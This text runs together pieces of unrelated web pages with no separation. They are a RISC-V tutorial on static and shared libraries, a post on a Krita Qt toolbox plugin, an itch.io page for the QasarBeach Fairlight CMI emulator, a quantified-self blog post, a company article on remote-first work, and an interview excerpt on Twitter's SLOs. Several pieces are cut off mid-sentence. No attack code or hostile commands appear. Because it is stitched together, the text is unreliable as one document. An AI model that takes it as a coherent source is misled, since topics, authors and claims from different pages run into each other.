<p>Yes, that’s 4,687,920 bytes or about 4.7 megabytes. However, if we looked at the symbol table, we will find that NO symbol is unresolved, and therefore this is a self contained executable. If we load this with our elf loader, no external resources will need to be pulled in.</p>



<p>Our linker must exhaustively follow every possible route and pull in those symbols even though they may never be called. We can see the symbol table is enormous due to all of the calls and global variable (such as errno).</p>

<hr>



<h2 id="dynamic">Dynamic Libraries (shared objects)</h2>



<p>Dynamic libraries end in .so, which stands for <em>shared object</em>. These libraries contain code that will not be added directly into the executable. Instead a program called the <em>dynamic linker</em> will be responsible for taking code from the .so files and adding them into an executing program. We can also add symbols ourselves using the -ldl (dynamic linker) library.</p>



<p>We can think of the term <em>dynamic</em> as <em>run-time</em>. That is, we don’t actually load the code into our program until the program actually runs. We can see this with something as simple as printf. We can examine our executable and we don’t see printf’s code. Instead, we see printf’s <em>stub</em>. This stub will then be replaced by the dynamic loader when the program executes.</p>



<p>When we link with a dynamic, shared object, those symbols that can be added at run time will remain unresolved. We will have the symbols’ names put into a table just so we know it’s out there somewhere. However, with shared objects, we now can get that <em>unresolved reference</em> (or symbol) at run-time! If you have arch-linux and have ever compiled anything yourself, you might’ve run into this phenomenon.</p>



<hr>



<h2>Making a Shared Library</h2>



<p>Let’s go ahead and turn our test2 file into a shared object. This is fairly easy to do with gcc:</p>



<pre>riscv64-unknown-linux-gcc -fPIC -shared -o libtest2.so test2.o</pre>



<p>The switch -fPIC stands for <em>position independent code</em>. That means all offsets cannot be relative outside of the library itself, and this is usually the case for most shared libraries. In this case, the generated code will be placed into a table to find the offsets. This is required since the library, or specific symbols in the library, can be loaded into any location by the dynamic linker.</p>



<p>Then, we can compile our test program to link to this shared library:</p>



<pre>riscv64-unknown-linux-gcc -o test test.o -L. -ltest2</pre>



<p>In the command above, I am specify the library search path with -L, so -L. means to look in the current directory. Then, I specify the library to link with using -ltest2. GCC will automatically prepend lib and append .so to make libtest2.so.</p>



<hr>



<h2 id="analyze">Analyzing A Shared Program</h2>



<p>First, we compile in the location of our library. We can see these shared libraries using the ldd command.</p>



<pre>smarz@DOMO:~ $ ./test<br>
./test: error while loading shared libraries: libtest2.so: cannot open shared object file: No such file or directory</pre>



<p>So, when I run my program, it looks at a certain path to find your libraries. This is analogous to the PATH environment variable, except in Linux (and some UNIXes), we use LD_LIBRARY_PATH. Shown below, if I change my path so the dynamic linker can find my library, it functions properly:</p>



<pre>smarz@DOMO:~ $ LD_LIBRARY_PATH=/home/smarz ./test 10 20<br>
Data = 200</pre>



<hr>



<h2 id="unresolved">Unresolved at Run Time</h2>



<p>When we link a program, many of the symbols will remain unresolved. This tells us what symbols the dynamic linker is responsible for loading from the shared objects (libraries). We can see these unresolved symbols using the nm command:</p>

<section>
<p>This time is not just a standalone mockup or a proof of concept, it is a real working toolbox right inside Krita.</p><p>A bit of background, so last November, gave the new Blender 2.8 &nbsp;a shot one morning. The new UI though threw me off for a bit was pretty, looked similar to the other <em>cool</em> apps in the town. And I went on to recreate that on Qt, which I did by midnight with some spaghetti code. Surprisingly that thing got some traction on hackernews for a day and died off, me too also left that as an one hit wonder. That was until, a couple months ago, people started discussion about improving Krita's current UI in Krita Artists. In the flow of conversation, my proof of concept got mentioned and that was enough to ignite others with different ideas. </p><p>People were trying to hack something similar to that in Krita, but more or less nobody was exactly sure how to proceed, or if it could be done with the current plugin API or not. And me being not the best developer in Python tried to stay away from it for sometime, but curiosity got me at last.</p><p>On the first look at the API, it looked rather simple exposing a set of higher level functions to Python. And thanks to <a href="https://marketplace.visualstudio.com/items?itemName=cg-cnu.vscode-krita-plugin-generator">this</a> vscode extension, I got something usable up in a few minutes of first poking into that.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/KPn4pNtoRUY?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>The code is, I would say rather simple if you are familiar with Qt. The tool box is a <code>QWidget</code> whose <code>paintEvent</code> was overridden and same is for the popup. Also I take control of the mouse events too along with the drawing. </p><pre><code>class ToolBox(QWidget):
    .
    .
    .
    def paintEvent(self, event):
        painter = QPainter()
        painter.begin(self)
        self.drawTools(painter, event.rect().topLeft() + QPoint(10, 5))
        painter.end()
    
    def drawTools(self, painter, topLeft):
        size = QSize(40, 40)
        drawRect = QRect(topLeft, size)
        for tool in self.tools:
            drawRect = QRect(topLeft, size)
            tool.paint(painter, drawRect)
            topLeft += QPoint(0, 45)
        self.setFixedSize(50, 45 * len(self.tools) + 5)
    .
    .
    .</code></pre><p>The Tool class is just a container to hold data related to the tool and it's sub-tools. Though it also does some drawing of its own, by borrowing the <code>QPainter</code> from either <code>ToolBox</code> or <code>Popup</code> classes.</p><pre><code>class Tool:
    .
    .
    .   
    def paint(self, painter, rect):
        self.toolRect = rect
        path = QPainterPath()
        path.addRoundedRect(QRectF(rect), 3, 3)
        color = highlightColor if self.isActivated or self.highlighted else backColor 
        painter.fillPath(path, color)
        newRect = rect.adjusted(10, 10, -10, -10)
        icon = Application.icon(self.icon)
        painter.drawPixmap(newRect, icon.pixmap(newRect.size()))

        if len(self.subTools) &gt; 0 :
            triangle = QPainterPath()
            triangle.moveTo(rect.bottomRight())
            triangle.lineTo(rect.bottomRight() + QPoint(0, -5))
            triangle.lineTo(rect.bottomRight() + QPoint(-5, 0))
            painter.fillPath(triangle, Qt.white)
    .
    .
    .</code></pre><p>If you want to try the plugin out, do grab it from <a href="https://github.com/hellozee/CoolBox/releases/tag/1.0">here</a>. </p><h3 id="some-know-issues">Some know issues</h3><ul>
<li>This tool box doesn't actually syncs with the original toolbox so, if you try to use the both at the same time, beware.</li>
<li>This a fixed tool box, can't be edited unless something is changed in the code. This is a feature not an issue.</li>
<li>The colors are hardcoded, might look awkward in some themes.</li>
</ul>
<h4 id="what-is-to-be-done-ahead"> What is to be done ahead?</h4><ul>
<li>Obviously fix the known issues.</li>
<li>Add text hinting for the tools.</li>
<li>Add a couple more items like Undo/Redo in the bottom? just a random thought.</li>
</ul>

July 1, 2020 | https://adamstrange.itch.io/qasarbeach | <a href="https://web.archive.org/web/*/https://adamstrange.itch.io/qasarbeach">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This is a complete recreation of the Fairlight CMI IIx.</p>
<p>This has all the features of the original Fairlight CMI including 16 stereo voices, full voice editing and realtime control, harmonic additive synthesis, full Page R sequencer and much more.</p>
<p>Here is a quick look at harmonic additive synthesis in realtime:</p>
<p><iframe width="500" height="281" src="//player.vimeo.com/video/399088327" frameborder="0" allowfullscreen=""></iframe></p>
<p>Full file support for Fairlight Series I, II, IIx, III samples,&nbsp;&nbsp;including all loop points, filter settings, etc. You just need to have the ORIGINAL files in .VC format.</p>
<p>Here is a live video capture of QasarBeach with no overdubs or added effects:</p>
<p><iframe src="//www.youtube.com/embed/RlAFyrQbUS0" frameborder="0" allowfullscreen=""></iframe></p>

<p>plus you get the following&nbsp;&nbsp;formats as pure samples, so editing may be needed, but it gives you the power to access virtually all famous sample libraries from Emu, Yamaha, Korg and more:</p>
<ul><li>.wav /&nbsp;.aif&nbsp;.ogg / .sam</li><li>.afs - casio cz1 sample</li><li>.ksf -korg-sample-file oasis<br>.msmpl_bank -korg microsampler bank<br>.p3k - korg</li><li>.usr - ppg<br>.ufs - ppg</li><li>.xoe, .x0v .x0a .x0s .x0w .x3v .x3a .x3s .x3w - yamaha motif<br>.t01 .t02 .t03 .t04 .t05 - yamaha</li><li>.krz .kr1 .kr2 .kr3 .kr4 .kr5 .kr6 -kerzweil</li><li>.sf2 -soundfont2</li><li>.akai .img - akai img</li><li>.256 -amiga 8bit single waveforms<br>.xi -amiga fasttracker 2<br>.8svx .16sv .iff - amiga 8 bit / 16bit</li><li>.em2 .eb2 .ez2 .e4b -emulator emax 2 library<br>.ebl -emulator x<br>.dms -emu2<br>.eii -emu2<br>.em1 .eb1 -emulator 1&nbsp;&nbsp;<br>.iso -emulator iso</li><li>.out .s50 .w30 -roland s50</li><li>.bin - 8 bit binary files used by LINN and EMU for drum machine ROM</li></ul>
<p>You will need to download all three files, especially the Guide which will tell you all about the very basic operations of QasarBeach.</p>
<p>The Fairlight CMI was a professional and&nbsp;complex machine, QasarBeach in no way tries to obscure this operation. So the UI is the same, the operation is the same, but there have been additions to make it a bit more user friendly.</p>
<p><a href="https://www.facebook.com/groups/277208163443745/" target="_blank" rel="nofollow noopener">Facebook Usergroup</a><br></p>
<p>There are four files:</p>
<p>QasarBeach.App: is the latest MacOS version</p>
<p>QasarBeachWIn: is the latest Windows version</p>
<p>QasarBeach.Tar: is the latest Linux version</p>
<p>Guide is the comprehensive PDF guide (shown on the right)</p>
<p>QasarBeach is the demo folder including &nbsp;demo and library&nbsp;files</p>
<p>Cookbook is a new PDF guide giving hints and recipes&nbsp;for getting more out of QasarBeach</p>

<p>Because Ver 1.25 is such a large release with many fixes and additions I have removed the previous update lists</p>
<p><strong>Ver 1.25 Update (28 June&nbsp;2020)</strong></p>

<p>QasarBeach is feature complete, but not completely documented. It is also being actively developed.</p>
<p>A HUGE thank you to all the testers and commenters. with you bug lists, wish lists and more :)</p>

<p>If you've ever wanted to have a go at your own music and want to know how The Art Of Noise, Kate Bush, Peter Gabriel, OMD, Yes, Hans Zimmer (and many many more) accomplished this in the 80's - QasarBeach is (almost) the way they did it!</p>

<p>Please feel free to add comments, thoughts, suggestions, etc. Nothing is out of bounds, so don't feel you might have a question that is odd, or strange bugs.</p></div></div>]]>

  <p><img src="http://mtsolitary.com/assets/img/tableau.jpg"></p><p>This is a photograph of spring in Tel Aviv, into which I emerged from the coronavirus lockdown a little bleary-eyed and with a newfound addiction to chocolate <a href="https://en.wikipedia.org/wiki/Krantz_cake"><em>krantz</em></a> yeast cakes.</p>

<hr>

<h2 id="1-examining-your-life">1. Examining your life</h2>

<blockquote>
  <p>The unexamined life is not worth living.</p>
</blockquote>

<p>I’ve always been drawn to this quote, usually attributed to Socrates. The original <a href="https://en.wikipedia.org/wiki/The_unexamined_life_is_not_worth_living">meaning</a> of the quote is to emphasise the need for a personal philosophy, a way of thinking about yourself, that uses reflection to build a better future self through reference to and critique of the past self. Today, the quote brings to my mind the <a href="https://en.wikipedia.org/wiki/Quantified_self">quantified self movement</a>, a group of people who are devoted to the idea of collecting information about themselves, reviewing it and drawing insights from it to improve, or at the very least understand, their lives.</p>

<p>I’m not sure what Socrates would have to say about this modern “data-driven” philosophy, but I have become more and more drawn to the idea over the past couple of years. I thought it might be interesting to share some of the things I’ve noticed over the last five hundred days about myself, in the hope that this might inspire others to consider paying closer attention to their lives. There’s another reason for sharing too: I think there is a certain aesthetic value inherent in the topology of life one can see writ in the charts, the moving of a line along the page tracing some weird average of the thousands of variables that make up a day in anyone’s life that nonetheless contains some sort of signal.</p>

<h3 id="sleep">Sleep</h3>

<p>The older I become the more convinced I am that sleep is one of the most important, perhaps the single most important, factor in remaining balanced, peaceful and energetic throughout the day. The chart below shows the hours I slept every night, together with a moving 7-day average, over the last five hundred days. I don’t use any fancy sleep trackers, I just write down in a spreadsheet every morning how many hours I slept the previous night.</p>

<p><img src="http://mtsolitary.com/assets/img/sleep.png" alt="Sleep"></p>

<p>There are several periods of my life which are clearly visible on this graph. The most striking is the birth of my son, in February this year, following which there were understandably a few weeks of very little sleep. There are periods of greatly increased variation around holidays I took. And at the beginning of the COVID-19 lockdown I used the time I saved not commuting to and from work every day to catch up on some of that sleep I lost in February.</p>

<h3 id="alcohol">Alcohol</h3>

<p>The quantified self movement is convinced that sleep, alcohol, other drugs and caffeine (in that order usually) have the biggest overall impact on mood and general contentment in life. I track all of these metrics, and when I looked at the plots I generated I wondered whether I really wanted to share the graph below, in which a black bar represents a day on which I consumed alcohol over the last five hundred days.</p>

<p><img src="http://mtsolitary.com/assets/img/alcohol.png" alt="Alcohol"></p>

<p>It’s pretty clear from the graph above that I drink too frequently (I thought about colouring the bars by the number of drinks, which I also track but ultimately went for the simpler version). I also notice the correlation between consecutive drinking days (usually a beer or two or a glass of wine in the evening) and stressful periods in my life.</p>

<h3 id="work">Work</h3>

<p>While I was writing <a href="http://mtsolitary.com/journal/xxvii.html">XXVII</a> and <a href="http://mtsolitary.com/journal/xxviii.html">XXVIII</a> I was looking for a metric that shows a visible effect of the COVID-19 lockdown and the best one I could find is of my daily working hours (these are the hours between the time I count myself as starting work and the time I count myself as finishing, so they include time like lunchbreaks, coffee and chatting in the office when I wasn’t strictly-speaking “working”. I use <a href="http://rescuetime.com/">Rescuetime</a> to track actual bum-in-seat computer time at work but I think that’s a less interesting chart).</p>

<p><img src="http://mtsolitary.com/assets/img/work_dur.png" alt="Work"></p>

<p>I like the healthy amounts of vacation time, and on second thoughts I think the effect visible from February (after my return from a too-short paternity leave) is probably more to do with being a first-time parent than the lockdown <em>per se</em>.</p>

<h3 id="anxiety">Anxiety</h3>

<p>The holy grail of self-tracking, of the reflective data scientist, is an answer to the question “am I happy” based on actual data from your life. For me the answer to the question “am I happy” on a day-to-day basis can be approximated with the answer to the question “how anxious am I feeling today”, and to that end I tried my best to track my general mood and feeling of contentment (10) or anxiety (0) at three points throughout the last five hundred days.</p>

<p><img src="http://mtsolitary.com/assets/img/mood.png" alt="Mood"></p>

<p>Notwithstanding the concerns about the accuracy of the data the way I collected it (upon reflection the morning after, all three data points for the previous day at the same time, and with vague definitions of the cutoffs between the three sections of the day) this is a really interesting graph to look at over a timescale like this. My favourite feature of the graph is the easily visible section in June 2019 where my evening mood is vastly better than my day and morning mood; this is because I was on holiday with my friends and in the days recovering from the hangovers caused by the evenings. There’s also the rise to almost universal happiness around the birth of my son and the accompanying few weeks of time at home, before the uncertainty and panic around COVID-19 in mid-March put an end to that.</p>

<p>I noticed that there was something interesting about this graph when I looked at it during an “end-of-year review” process at the end of 2019, so I decided to start tracking a few more metrics related to anxiety. The most interesting, and most striking I think, is the “state of my fingernails”. It’s a simple 0-10 scale.</p>

<p><img src="http://mtsolitary.com/assets/img/nails.png" alt="Fingernails"></p>

<p>I’m not very proud of it, but I’ve been biting my fingernails for as long as I can remember. It’s absolutely a manifestation of anxiety and tension and I’m very aware that during difficult or stressful periods of my life I bite my fingernails more. It’s a habit that I would very much like to be rid of and I hope that understanding it is the first step to being free of it.</p>

<hr>

<p>Of course, none of this means anything if you don’t have the ability and the drive to actually act on the things you observe. That’s the next step for me, to try and <em>improve</em> the metrics in these graphs over time, to use my synthesised understanding of my past to influence the topology of these graphs in the future. Maybe that’s just a long-winded way of saying “examining yourself”: looking at yourself critically and trying to do better, or at the very least understand when you could do better and why you didn’t. I hope this post will go some way to making me accountable to myself, and hope to revisit these metrics and whichever new ones I start collecting throughout my life once a year to see how things are going.</p>

<p><span><span>I</span>s your company remote-first or remote-friendly?&nbsp;</span></p>
<p><span>There is a significant difference and not every company with remote or distributed teams is the same!&nbsp;</span></p>
<p><span>The COVID-19 pandemic forced most businesses to ask all their employees to <a href="https://www.peoplebox.ai/blog/remote-work-guide-for-managers/">work from home</a>. </span></p>
<p><span>Now, as restrictions are being eased in various countries, a small portion of the workforce is <a href="https://www.peoplebox.ai/blog/managing-employees-return-to-work/">returning to their offices</a>.</span></p>
<p><span>It is interesting to note that a </span><a href="https://www.gartner.com/en/newsroom/press-releases/2020-04-03-gartner-cfo-surey-reveals-74-percent-of-organizations-to-shift-some-employees-to-remote-work-permanently2#:~:text=A%20Gartner%2C%20Inc.%20survey%20of,remote%20positions%20post%2DCOVID%2019."><span>Gartner survey</span></a><span> of 317 CFOs and finance leaders revealed that 74% intend to move at least 5% of their previously on-site workforce to <strong>permanently remote positions</strong> post-COVID-19.</span></p>

<figure id="attachment_5120" aria-describedby="caption-attachment-5120"><img src="https://www.peoplebox.ai/wp-content/uploads/2020/06/Gartner-graph.png" alt="Gartner remote work graph" width="744" height="311" srcset="https://www.peoplebox.ai/wp-content/uploads/2020/06/Gartner-graph.png 744w, https://www.peoplebox.ai/wp-content/uploads/2020/06/Gartner-graph-300x125.png 300w" sizes="(max-width: 744px) 100vw, 744px"><figcaption id="caption-attachment-5120">Source: Gartner</figcaption></figure>

<p><span>CFOs have previously reported to Gartner that they were taking further steps to support remote employees by enabling more flexible work schedules and providing company-issued work from home equipment.&nbsp;</span></p>
<p>This is certainly good news because <a href="https://www.peoplebox.ai/blog/transitioning-to-remote-work-heres-what-you-should-know-as-a-manager/">remote work</a> has several benefits — it reduces costs for the company, lowers one’s carbon footprint, and leads to a rise in <a href="https://www.peoplebox.ai/blog/covid-19-11-ways-to-be-productive-while-working-from-home/">productivity</a> and <a href="https://www.peoplebox.ai/blog/how-important-is-remote-employee-engagement-to-team-productivity/">employee engagement</a>.</p>
<p>Paul Farnell, CEO of Litmus, talks about misconceptions around remote work:</p>

<blockquote><p><span>One misconception about remote work is that it hinders collaboration. In my experience, the inverse is more likely: offices hinder independent work. Collaboration tends to happen in short bursts, followed by longer periods of writing, designing, coding, and thinking. It’s more important to give employees quiet time than it is to cram them into an open office.</span></p></blockquote>

<p>However, a successful remote-first company must do more than just ‘let’ employees work from home.</p>
<p>Given the current circumstances, you have probably decided to have the majority of your workforce continue to <a href="https://www.peoplebox.ai/blog/top-5-challenges-of-managing-remote-employees/">work from home</a>.</p>
<p>The next logical question is — are you a remote-first or remote-friendly company?</p>
<p>If you’re one of the decision-makers at your organization, this blog will help you understand the difference between a remote-first company vs. a remote-friendly company.</p>
<p>You can then clearly communicate your stand to your employees.</p>
<h2><strong>Definition: Remote-first &amp; remote-friendly</strong></h2>
<h4>Remote-friendly company</h4>
<p>If a company is remote-friendly<strong>,</strong> it allows <a href="https://www.peoplebox.ai/blog/engaging-remote-employees-during-and-after-covid-19/">employees to work remotely</a> some of the time but most of the work is done in their physical office.</p>

<div>
<p><strong>Remote work is considered a perk or a privilege.</strong></p>

</div>

<p>For instance, an employee may work from home for 1-2 days per week.</p>
<p>In remote-friendly companies, sometimes only certain people are allowed the privilege to work from home. However, the company culture is such that it is easier to work in the office.</p>
<p>Remote employees may feel invisible or ignored in such companies or may believe that they’re losing out on opportunities for <a href="https://www.peoplebox.ai/blog/managers-guide-to-career-development-plan-for-remote-employee/">career development</a>.</p>
<p>In a remote-friendly company:</p>
<ul>
<li>Employees may choose to <a href="https://www.peoplebox.ai/blog/10-mistakes-to-avoid-during-remote-one-on-one-meetings/">work from home</a> for a few days in the week or month.</li>
<li>Team members may be allowed to or may choose to work from home for extended periods.</li>
<li>Remote workers can split their time between the many physical offices of the company.</li>
<li>Employees are mostly free to choose their working hours, especially if the team consists of people living in different time zones.</li>
</ul>

<h4>Remote-first company</h4>
<p>In a remote-first company, work from home (or anywhere!) is the default way of working.</p>
<p>It isn’t viewed as a benefit for employees or included to make the company look progressive or radical.</p>

<div>
<p><strong>Remote work is part of the ‘design’ of the company.</strong></p>

</div>

<p>The company may have been started with a non-centralized work setting in mind or it may have shifted to remote work after a crisis, such as the current COVID-19 pandemic, to reduce costs.</p>
<p>It is more likely the employees at a remote-first company don’t work in the same time zone because the company can source talent from literally anywhere in the world.</p>
<p>Not everybody is suited to work at remote-first companies. Employees require self-discipline, accountability, excellent communication skills, and flexibility to flourish in such settings.</p>
<p>When such companies hire people, they look for these qualities more than years of experience or technical skills.</p>
<h2><strong>Remote-first vs. remote-friendly: How are they different?</strong></h2>
<p>You may say that the distinction between a remote-first vs. remote-friendly company is merely a technicality.</p>
<p>In practice, it makes a world of difference to employees.</p>
<p><strong>Before we delve further into how these two types of companies are different, let us understand how the terms ‘distributed team’ and ‘remote team’ are also different.</strong></p>
<h4><strong>Distributed teams</strong></h4>
<p>Distributed teams are physically ALL distributed away from each other.</p>
<p>Employees could be working from home or a co-working space where none of their team members work.</p>

<div>
<p><strong>Team members rarely see each other face-to-face and often work in different time zones and countries.</strong></p>

</div>

<p>Thus, distributed teams could literally be ‘distributed’ all over the world.</p>
<h4><strong>Remote teams</strong></h4>
<p>Team members are physically separated from each other, but not everyone in the company works from home or is situated on opposite ends of the world.</p>

<div>
<p><strong>Remote teams may have a few members working from home, whereas the rest of the team is centrally located in an office.</strong></p>

</div>

<p>Team members may also all work from home, but stay within a specified distance from a physical office where they meet from time to time.</p>
<p>Thus, it stands to reason that remote-first companies have distributed teams, whereas remote-friendly companies have remote teams.</p>
<p>The important thing to remember is that no matter what the form, remote work can be challenging in addition to having its advantages.</p>

<figure id="attachment_5125" aria-describedby="caption-attachment-5125"><img src="https://www.peoplebox.ai/wp-content/uploads/2020/06/remote-friendly-vs-remote-first-1024x686.png" alt="table of differences: remote-friendly vs. remote-first" width="1024" height="686" srcset="https://www.peoplebox.ai/wp-content/uploads/2020/06/remote-friendly-vs-remote-first-1024x686.png 1024w, https://www.peoplebox.ai/wp-content/uploads/2020/06/remote-friendly-vs-remote-first-300x201.png 300w, https://www.peoplebox.ai/wp-content/uploads/2020/06/remote-friendly-vs-remote-first-768x515.png 768w, https://www.peoplebox.ai/wp-content/uploads/2020/06/remote-friendly-vs-remote-first.png 1504w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption id="caption-attachment-5125">Source: Doist</figcaption></figure>

<p>There are a number of areas around which remote-first vs. remote-friendly companies differ:</p>

<h4><span><span>1</span></span>Attitude</h4>
<p>As we’ve mentioned previously, a <strong>remote-friendly company</strong> considers work from home a perk for selected employees or more senior employees.</p>
<p>A <strong>remote-first company</strong> structures itself around work from home–it’s built into its DNA.</p>
<p>Often, the company is established with systems and processes geared around people distributed across the world.</p>
<h4><strong><span><span>2</span></span>Communication</strong></h4>
<p><strong>In a remote-friendly company</strong>, a majority of the decisions are taken after a face-to-face discussion.</p>
<p>Everybody knows what has been discussed, so people are not rushing to document the <a href="https://www.peoplebox.ai/blog/effective-communication-during-covid-19-crisis/">communication</a> or publish the decisions right away.</p>
<p>There is no system to keep <a href="https://www.peoplebox.ai/blog/how-to-manage-remote-employees-effectively/">remote employees</a> informed, so information often slips through the cracks.</p>
<p>Thus, remote employees may lose the opportunity to contribute to discussions or have their say in an important decision.</p>
<p><strong>In a remote-first company</strong>, <a href="https://www.peoplebox.ai/blog/remote-work-tools-to-manage-remote-teams-effectively/">tools</a> for documentation and online communication are the norm.</p>
<p>Nobody meets face-to-face, so systems are set up for the smooth flow of information and accessibility.</p>
<p>There are no private discussions for important decisions–all such conversations happen on public channels.</p>
<p>Various channels on Slack may be used to convey relevant information, such as company-wide communication, team communication, or project communication.</p>

<h4><span><span>3</span></span>Meetings</h4>
<p><strong>In remote-friendly companies</strong>, remote team members join in on <a href="https://www.peoplebox.ai/blog/tools-for-effective-remote-one-on-one-meetings/">meetings</a> that take place in a physical office. It is a different experience from when everyone meets online.</p>
<p>Remote team members may miss out on side conversations that take place between people sitting in the office.</p>
<p>Technical issues or disruptions at home may prevent them from fully taking part in the discussion.</p>
<p>People may be reluctant to include remote team members on ad hoc meetings or quick discussions because of the hassles of finding a meeting room or connecting promptly.</p>
<p><strong>In a remote-first company</strong>, video calls are the go-to method of conducting meetings.</p>
<p>The employee is as responsible as the company to ensure that these calls are as streamlined as possible — minimum distractions and background noise, stable Internet connection, effective tools, and proper equipment.</p>
<h4><span><span>4</span></span>Bonding</h4>
<p>Office banter and small talk are important components of team bonding, even though they may seem insignificant. They help people open up to each other in a way that cannot be replicated in group meetings.</p>
<p><strong>In a remote-friendly company</strong>, remote team members miss out on the opportunity to <a href="https://www.peoplebox.ai/blog/7-ways-to-build-rapport-with-your-employees/">build a rapport</a> with their coworkers. This causes them to feel left out and disengaged.</p>
<p>Usually, remote workers are a minority in a remote-friendly company, so there’s not much that can be done about this.</p>
<p><strong>In a remote-first company</strong>, everybody is a part of the distributed team so each person is on an equal footing.</p>
<p>Virtual water cooler conversations may happen over Slack channels, ensuring that everyone gets to chitchat and bond with each other.</p>

<div>
<p><strong>Managers and direct reports can bond over <a href="https://www.peoplebox.ai/blog/covid-19-how-to-build-a-better-connect-with-your-remote-team/">icebreaker questions</a>, and this activity is even more helpful during times of crisis such as the current COVID-19 pandemic.<br>

<h4><span><span>5</span></span>Hiring</h4>
<p><strong>Remote-friendly companies</strong> may limit their hiring to people within a specific distance from their physical offices or may ask the potential hire to relocate.</p>
<p>Face-to-face time is still valued in such companies, so the candidate who is willing to move to the office location is often chosen even if other people have better skills.</p>
<p><strong>A remote-first company</strong>, on the other hand, has access to a larger geographic area than the local market.</p>
<p>Such employers value talent and a good fit over location because there is no physical office.</p>
<h4><span><span>6</span></span>Measuring productivity</h4>
<p><strong>In a remote-friendly company</strong>, an employee’s productivity may be measured by the number of hours she has put in at work.</p>
<p><strong>In a remote-first company</strong>, everybody works different hours so the focus is on the results they show.</p>

<h2>Benefits of a remote-first company</h2>
<p><strong>We’ll discuss the benefits of remote-first vs. remote-friendly companies to demonstrate how both approaches have certain advantages:</strong></p>
<h4><span><span>1</span></span>Access to top talent</h4>
<p>When you hire someone for a physical office, you try to ensure that the candidate lives within a reasonable distance of the office location and can easily commute to work every day.</p>
<p>A remote-first company does not suffer from these restraints. Talented people can be hired from …</p></div></div>

Click </em><a href="http://www.blameless.com/blog/twitters-reliability-journey"><em>here</em></a><em> for part 1 of the interview with Brian, Carrie, JP, and Zac to learn more about </em><a href="https://www.blameless.com/blog/twitters-reliability-journey"><em>Twitter’s SRE journey</em></a><em>.</em><br></p><p><a href="https://www.blameless.com/blog/twitters-reliability-journey">Previously</a>, we saw how SRE at Twitter has transformed their engineering practice to drive production readiness at scale. The concept of service level objectives (SLOs) and error budgets have been key to this transformation, as SLOs shape an organization’s ability to make data-oriented decisions around reliability. (Read <a href="https://www.blameless.com/how-slos-transformed-evernote/">here</a> for a definition of SLOs and how they transformed Evernote). Today, the Twitter team has invested in centralized tooling to measure, track, and visualize SLOs and their corresponding error budgets.&nbsp;<br></p><p>However, successfully implementing SLOs is far easier said than done. Many organizations have struggled with adoption for a number of reasons. Common obstacles include getting stakeholder buy-in, not knowing what (and how) to measure, and confusion over how to make SLOs actionable.&nbsp;&nbsp;<br></p><p>While the Twitter engineering team had laid a very strong foundation around observability and reliability, it took several important breakthroughs before SLOs began achieving broader adoption within the organization and the journey continues.<br></p><h3>The foundations for SLO</h3><p>Prior to SLOs, the engineers had used service level indicators (SLIs) for many years.&nbsp; The SLIs drew from Twitter’s extensive instrumentation of infrastructure and investments in their observability stack. Their observability stack provided a foundation for measuring service health with indicators such as success rate, latency, and throughput across their distributed service ecosystem. For example, the team would monitor the success rate for user-facing HTTP services, which they computed by looking at HTTP 500 errors versus total requests.&nbsp;<br></p><p>Integrating the SLIs with alerts and on-call rotations had been a core practice within their engineering teams for years.&nbsp; Additionally, their focus on incident management and postmortems has enabled them to continuously learn from their always evolving production ecosystem.<br></p><p>A significant inflection point came with embedding the concept of SLO within <a href="https://twitter.github.io/finagle/">Finagle</a>, Twitter’s RPC library, which is maintained by the Core Systems Libraries (CSL) team. As mentioned in the previous post, Finagle delivers reliability features such as load balancing, circuit breakers, failure detectors, and more, filling them inside every single piece of software that runs. In 2018, the CSL team made SLOs a first-class entity in the Twitter internal version of Finagle, creating a foundational API building block that is tied to a service boundary, which they call an objective. This was transformative in that it allowed the team to begin defining service-to-service interactions and modeling beyond just an alert, creating a programmatic definition that the team could now use to inform runtime decisions.&nbsp;<br></p><p>The Twitter team supported the implementation with proposals for projects and use cases that could use the SLO feature, and initially delivered the configuration as well as realtime per-instance measurement of SLOs.&nbsp;&nbsp;<br></p><p>In its initial phases, adoption of the feature was limited. Service owners could configure SLOs, but due to a lack of tooling and benefits automatically associated with turning SLOs on, there was little incentive to do so in context of other priorities.<br></p><p>Seeing this, the team invested in follow-up work. They began to build integrations and solutions for service owners on top of SLOs, such as load-shedding based on SLOs as they provided more useful context than a related metric like CPU throttling. Through piloting such enhancements, the appetite for adoption began to increase.&nbsp;<br></p><h3>Defining SLOs</h3><p>In thinking about how to define SLOs, the Twitter team typically begins by considering which features are key, and ensuring that they're well instrumented and understood.<br></p><p>It’s important to identify the signals that best reflect a critical user experience. Some signals for service success rate can provide color but are not so straightforward to interpret. For example, in analyzing the service error rate inside the data center, the client might retry those requests, making it a faulty datapoint to reason around what the true user success rate is.<br></p><p>Once the team sets a reasonable SLO at the top level, that will drive down through the services that a boundary depends on. Every service has a multitude of service dependencies, and thus the latency and success SLOs for all upstream and downstream services must all work together in context of the defined boundary. SLOs enable a more holistic way of measuring the whole call path.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 	</p><h3>A major turning point: tying SLOs to error budgets</h3><p>The introduction of error budgets marked another critical inflection point in Twitter’s adoption of SLOs. Error budgets make SLOs actionable and provide a different lens to understand a service over time, so they were an important follow-on feature after the original delivery of SLOs.&nbsp;<br></p><p>Error budgets look at the SLO over time, and thus have allowed the team to begin tracking performance by providing a historical view into how the service met objectives through different timeframes. The traditional metric view tends to be shortsighted, and can bury signals around valuable trends and opportunities. Instead of a dashboard that charts hundreds of metrics, error budgets become a forcing function to pick a few of the most important metrics, and get deeper into how and why they change over time.&nbsp;<br></p><p>An important note is that the team does not prescribe a fixed set of actions upon the exhaustion of the error budget. While error budgets can be a powerful tool, the true value has to resonate with engineering and product teams.&nbsp;<br></p><p>With the notion of “<a href="https://www.linkedin.com/pulse/netflixs-context-control-how-does-work-steve-urban/">context, not control</a>” (coined by Netflix), there is strong emphasis on empowering well-intentioned, capable teammates with visualizations and insights to allow them to make better decisions. In the same way, Twitter SREs apply ongoing experimentation to understand what other team members will view as valuable to measure. They understand that error budgets are more about giving team members good tools and context; there is no one policy fits all.&nbsp;&nbsp;<br></p><p>For example, one team hypothesized that the error budget would help inform when automated deploys could proceed, and specifically, whether to pause a deploy if the error budget was exhausted.&nbsp; But what they found was that sometimes the deploy being paused or blocked could contain the fix for the increased errors. Thus, that simple rule of “block deploys 